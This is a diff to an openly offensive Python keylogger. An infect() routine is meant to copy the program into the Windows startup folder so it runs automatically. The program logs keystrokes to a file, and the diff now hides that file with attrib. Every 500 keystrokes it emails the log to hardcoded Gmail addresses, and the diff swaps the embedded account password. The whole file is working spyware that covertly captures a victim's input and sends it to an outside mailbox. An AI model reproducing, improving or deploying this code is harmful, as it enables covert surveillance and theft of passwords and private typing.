@@ -9,7 +9,6 @@ max_strokes, n_strokes = 500, 0
 Generate an executable at the startup's windows folder so the keylogger can be automatically runned
 """
 
-
 def infect():
     import os
     from shutil import copy2
@@ -116,8 +115,13 @@ def on_press(key):
     f.close()
 
     if(n_strokes==max_strokes):
-        send_mail('teamcyber541@gmail.com', 'thepantiesbreakers', 'teamcyber5412@gmail.com')
-        open('log.txt', 'w').close()
+        send_mail('teamcyber541@gmail.com', 'new_password100', 'teamcyber5412@gmail.com')
+        try:
+            subprocess.check_call(["attrib", "-H", "log.txt"])
+        except:
+            pass
+        open('log.txt', 'w+').close()
+        subprocess.check_call(["attrib", "+H", "log.txt"])
         n_strokes = 0
 
 
@@ -125,7 +129,12 @@ def on_press(key):
 
 infect()
 
-open('log.txt', 'w').close()
+try:
+    subprocess.check_call(["attrib", "-H", "log.txt"])
+except:
+    pass
+
+open('log.txt', 'w+').close()
 subprocess.check_call(["attrib", "+H", "log.txt"])
 
 listener = keyboard.Listener(on_press=on_press)
@@ -133,4 +142,4 @@ listener = keyboard.Listener(on_press=on_press)
 listener.start()  # start to listen on a separate thread
 listener.join()  # remove if main thread is polling self.keys
 
-send_mail('teamcyber541@gmail.com', 'thepantiesbreakers', 'teamcyber5412@gmail.com')
+send_mail('teamcyber541@gmail.com', 'new_password100', 'teamcyber5412@gmail.com')
